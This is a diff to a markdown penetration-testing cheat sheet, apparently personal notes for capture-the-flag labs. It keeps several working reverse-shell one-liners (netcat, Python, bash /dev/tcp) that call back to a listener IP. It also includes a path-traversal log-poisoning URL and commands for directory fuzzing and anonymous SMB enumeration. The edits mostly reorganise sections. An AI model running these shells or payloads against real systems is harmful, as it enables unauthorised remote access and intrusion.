@@ -40,19 +40,15 @@ EOF
 
 ---
 #### Reverse shells
-* nc
 ```nc
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
 ```
-* python
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
-* python3
 ```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
-* bash
 ```bash
 bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 ```
@@ -89,13 +85,15 @@ nc -l ATTACKER_PORT > [output_file_path]
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
-### Web
+<details><summary>Web</summary>
+
 #### Discover hidden directories:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
 
 feroxbuster -u http://10.10.46.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
 ```
+
 #### Discover subdomains with `wfuzz` :
 ```
 wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
@@ -130,6 +128,8 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 
 #### cadaver for WebDAV
+
+</details>
 
 ---
 ### Privilege Escalation:
@@ -251,9 +251,17 @@ regedit
 <details><summary>Group policy objects</summary>
 a collection of settings that can be applied to OUs
 </details>
+
+<details><summary>PowerShell enumeration</summary>
+
+view all of the hidden files in the current directory
+```
+Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
+```
+</details>
 </details>
 
-<details><summary> SMB discovery </summary>
+<details><summary> SMB enumeration </summary>
 
 enumerate
 
@@ -268,6 +276,7 @@ smbclient -L 10.10.251.241
 
 enumeration
 ```
+smbmap -H 10.10.13.234
 smbmap -H '10.10.13.234' -u '' -p '' -R 
 smbmap -H '10.10.195.72' -u '' -p '' -R -A 'enter.txt' #download file
 ```
